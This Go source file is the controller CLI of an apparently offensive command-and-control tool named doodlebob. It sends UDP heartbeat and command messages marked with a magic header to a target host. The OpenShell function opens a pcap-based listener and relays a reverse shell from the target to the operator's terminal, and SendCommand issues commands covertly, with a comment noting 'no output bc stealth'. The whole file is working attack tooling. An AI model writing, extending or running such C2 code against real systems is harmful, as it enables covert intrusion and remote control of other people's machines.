// Contains the backend logic for the controller cli
package cli

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/netip"
	"os"
	"os/signal"
	"strconv"
	"time"

	"github.com/MeHungr/doodlebob/internal/message"
	"github.com/MeHungr/doodlebob/pkg/network"
	"github.com/MeHungr/pcapnet"
	"golang.org/x/term"
)

// prependHeaderAndSend adds the magic header to the beginning of the message and sends it
func prependHeaderAndSend(msg *message.Message, conn net.Conn) error {
	// Add the magic header to the message
	jsonPayload, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("encoding message: %w", err)
	}
	payload := append(message.MagicHeader, jsonPayload...)

	// Send json payload
	if _, err := conn.Write(payload); err != nil {
		return fmt.Errorf("writing UDP payload: %w", err)
	}

	return nil
}

// Heartbeat sends a heartbeat to the host and waits for a response
func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
	// Join the IP and port
	addr := net.JoinHostPort(udpTarget, targetPort)

	listener, err := net.ListenPacket("udp", ":"+srcPort)
	if err != nil {
		return fmt.Errorf("opening shell listener: %w", err)
	}
	defer listener.Close() // Close listener when function returns

	errChan := make(chan error, 2)
	doneChan := make(chan struct{})

	// Listen for heartbeat concurrently
	go func() {
		buf := make([]byte, 1024)
		// ReadFrom blocks until a UDP packet arrives
		n, addr, err := listener.ReadFrom(buf)
		if err != nil {
			errChan <- fmt.Errorf("reading from connection: %w", err)
			return
		}

		message := string(buf[:n])
		fmt.Printf("Received heartbeat from %q: %s\n", addr.String(), message)
		close(doneChan) // Signal successful completion
	}()

	// Dial the target with udp to send heartbeat request
	go func() {
		targetAddr, err := net.ResolveUDPAddr("udp", addr)
		if err != nil {
			errChan <- fmt.Errorf("resolving target: %w", err)
			return
		}

		msg := &message.Message{
			Type:    message.Heartbeat,
			DstIP:   targetIP,
			DstPort: targetPort,
			SrcIP:   srcIP,
			SrcPort: srcPort,
			Data:    "",
		}

		jsonPayload, err := json.Marshal(msg)
		if err != nil {
			errChan <- fmt.Errorf("encoding message: %w", err)
			return
		}

		payload := append(
			append([]byte(nil), message.MagicHeader...),
			jsonPayload...,
		)

		_, err = listener.WriteTo(payload, targetAddr)
		if err != nil {
			errChan <- fmt.Errorf("sending heartbeat: %w", err)
		}
	}()

	// Handle synchronization and errors safely
	select {
	case err := <-errChan:
		return fmt.Errorf("heartbeat failed: %w", err)
	case <-doneChan:
		return nil // Success
	}
}

// OpenShell opens a listener on the control host for a reverse shell from the target
func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellType) error {
	// Obtains the source ip and picks a random port for the reverse shell
	rawIP := network.LocalIP().String()
	srcPort := rand.Intn(45000) + 10000
	srcIP, _, err := net.SplitHostPort(rawIP)
	if err != nil {
		srcIP = rawIP
	}

	// ========= PCAP TCP STACK ==========
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	setupCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	pool, err := netip.ParsePrefix("172.16.0.0/16")
	if err != nil {
		return fmt.Errorf("invalid -subnet: %w", err)
	}

	// Valid host gateway inside the subnet pool range
	virtualIP, err := netip.ParseAddr("172.16.0.1")
	if err != nil {
		return err
	}

	addr := network.LocalIP().IP
	localIP, _ := netip.AddrFromSlice(addr)
	device, err := network.GetNetworkInterface(addr)
	if err != nil {
		return fmt.Errorf("invalid interface: %w", err)
	}

	udpCfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalIP: localIP, LocalPort: uint16(srcPort), ReserveUDPPort: true}
	serverCfg := pcapnet.ServerConfig{VirtualIP: virtualIP, AddressPool: pool, MTU: 1200, MaxPeers: 1}

	var listener *pcapnet.TCPServer
	listener, err = pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, srcPort)
	if err != nil {
		return fmt.Errorf("opening shell listener: %w", err)
	}
	defer listener.Close()
	// ========= PCAP TCP STACK ==========
	defer listener.Close()

	portStr := strconv.Itoa(srcPort)
	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, portStr, shellType); err != nil {
		return fmt.Errorf("sending shell message: %w", err)
	}

	type connResult struct {
		conn net.Conn
		err  error
	}
	ch := make(chan connResult, 1)

	go func() {
		c, e := listener.Accept()
		ch <- connResult{conn: c, err: e}
	}()

	go func() {
		<-ctx.Done()
		listener.Close()
	}()

	var res connResult
	select {
	case res = <-ch:
	case <-ctx.Done():
		return ctx.Err()
	}

	if res.err != nil {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		return fmt.Errorf("accepting connection: %w", res.err)
	}

	conn := res.conn
	defer conn.Close()

	fmt.Printf("[+] Target connected from %s!\nOpening doodlebob terminal >:3\n", conn.RemoteAddr())

	var oldState *term.State
	switch shellType {
	case message.ShellNativePty, message.ShellPcapPty:
		oldState, err = term.MakeRaw(int(os.Stdin.Fd()))
		if err != nil {
			return fmt.Errorf("setting raw terminal: %w", err)
		}
	}

	restoreTerminal := func() {
		if oldState != nil {
			_ = term.Restore(int(os.Stdin.Fd()), oldState)
			oldState = nil
		}
	}
	defer restoreTerminal()

	disconnected := make(chan struct{})

	go func() {
		select {
		case <-ctx.Done():
			conn.Close()
		case <-disconnected:
		}
	}()

	go func() {
		_, _ = io.Copy(os.Stdout, conn)
		fmt.Print("\r\n[-] Target disconnected.\r\n")
		close(disconnected)
	}()

	go func() {
		_, _ = io.Copy(conn, os.Stdin)
	}()

	select {
	case <-disconnected:
		p, err := os.FindProcess(os.Getpid())
		if err == nil {
			_ = p.Signal(os.Interrupt)
		}
		<-ctx.Done()
	case <-ctx.Done():
	}

	restoreTerminal()
	return nil
}

// sendShell sends a shell message to the target host
func sendShell(udpTarget, targetIP, targetPort, srcIP, srcPort string, shellType message.ShellType) error {
	// Join the IP and port
	addr := net.JoinHostPort(udpTarget, targetPort)

	// Dial the target with udp
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return fmt.Errorf("connecting to client: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	// Create message struct
	msg := &message.Message{
		Type:    message.MessageType(shellType),
		DstIP:   targetIP,
		DstPort: targetPort,
		SrcIP:   srcIP,
		SrcPort: srcPort,
		Data:    "",
	}

	// Add the magic header and send the message. Returns any errors from this function
	return prependHeaderAndSend(msg, conn)
}

// SendCommand sends a command to the target host
// There is no output bc stealth
// udpTarget is the target for the UDP packet
// targetIP is the target of the command
func SendCommand(udpTarget, targetIP, port string, cmd string) error {
	// Join the IP and port
	addr := net.JoinHostPort(udpTarget, port)

	// Dial the target with udp
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return fmt.Errorf("connecting to client: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	// Create message struct
	msg := &message.Message{
		Type:    message.Command,
		DstIP:   targetIP,
		DstPort: port,
		Data:    cmd,
	}

	// Add the magic header and send the message. Returns any errors from this function
	return prependHeaderAndSend(msg, conn)
}
